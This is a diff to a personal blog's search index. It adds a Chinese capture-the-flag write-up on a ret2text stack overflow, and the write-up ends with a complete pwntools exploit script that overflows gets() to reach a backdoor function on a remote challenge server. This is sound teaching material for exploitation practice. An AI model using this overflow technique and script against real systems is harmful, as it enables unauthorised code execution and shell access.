@@ -1,22 +1,38 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2026/10/08/hello-world/</url>
-    <content><![CDATA[<p>Hello World.</p>
-<p>学一门新语言、开一个新项目，第一件事总是先让它向世界问个好。新博客也一样，就从这个标题开始。</p>
+    <title>来一个简单ret2text</title>
+    <url>/2026/10/24/simple-ret2text/</url>
+    <content><![CDATA[<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>将题目附件拖入IDA打开</p>
 <span id="more"></span>
 
-<p>这里是我的个人博客，准备用来放技术笔记和平时的一些零散想法。</p>
-<p>之所以想有个自己的地方：写下来的东西，才算真正想清楚过。放在自己的站点上，排版是自己的，数据也是自己的。</p>
-<p>暂时没什么宏大的计划，就是慢慢写、一直写。</p>
-<p>那么，从这一篇开始。</p>
+<p><img src="/img/simple-ret2text/01.png"></p>
+<p>左侧可以看到有backdoor后门函数</p>
+<p><img src="/img/simple-ret2text/02.png"></p>
+<p><img src="/img/simple-ret2text/03.png"></p>
+<p>再看从程序开始执行到vuln函数，有一个gets()函数，这是一个栈溢出漏洞，因为没有对输入做出长度检查，我们可以去进行栈溢出</p>
+<p>双击s可以看到s这里的栈布局</p>
+<p><img src="/img/simple-ret2text/04.png"></p>
+<p>也可以在c代码页面中直接看，s这个参数到栈底rbp的距离是0x20</p>
+<p><img src="/img/simple-ret2text/05.png"></p>
+<p>但是在这个溢出点前还有一个taffy()函数，点进去看一下是干什么用的</p>
+<p><img src="/img/simple-ret2text/06.png"></p>
+<p>这里可以看到，这是对输入的字符进行一个比较，但是这是没有什么作用的，所以这里随便填，就能到下面的溢出点了</p>
+<p>去查看backdoor()的地址，0x40123B</p>
+<p><img src="/img/simple-ret2text/07.png"></p>
+<p>然后就可以去构造payload了</p>
+<p>先发送0x20的垃圾数据填充从s到栈底的空间，再发送一个0x8的数据覆盖rbp，ret地址在rbp的下一位，所以在填充完从s到覆盖rbp的位置后就可以直接传backdoor()的函数</p>
+<p>栈空间布局：</p>
+<p><img src="/img/simple-ret2text/08.jpeg" alt="画板"></p>
+<h2 id="解题脚本（exp）"><a href="#解题脚本（exp）" class="headerlink" title="解题脚本（exp）"></a>解题脚本（exp）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;175.24.227.50&#x27;</span>,<span class="number">35264</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x40123B</span></span><br><span class="line">ret_gadget = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x20</span> + <span class="number">8</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p64(ret_gadget) + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;大唐王朝中是谁开疆拓土？&#x27;</span>.encode(),<span class="string">b&#x27;taffy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;请开始你的表演：&#x27;</span>.encode(), payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>生活</category>
+        <category>技术笔记</category>
       </categories>
       <tags>
-        <tag>随笔</tag>
+        <tag>Pwn</tag>
+        <tag>栈溢出</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -72,6 +88,25 @@
         <tag>漏洞分析</tag>
         <tag>IoT</tag>
         <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2026/10/08/hello-world/</url>
+    <content><![CDATA[<p>Hello World.</p>
+<p>学一门新语言、开一个新项目，第一件事总是先让它向世界问个好。新博客也一样，就从这个标题开始。</p>
+<span id="more"></span>
+
+<p>这里是我的个人博客，准备用来放技术笔记和平时的一些零散想法。</p>
+<p>之所以想有个自己的地方：写下来的东西，才算真正想清楚过。放在自己的站点上，排版是自己的，数据也是自己的。</p>
+<p>暂时没什么宏大的计划，就是慢慢写、一直写。</p>
+<p>那么，从这一篇开始。</p>
+]]></content>
+      <categories>
+        <category>生活</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
       </tags>
   </entry>
 </search>
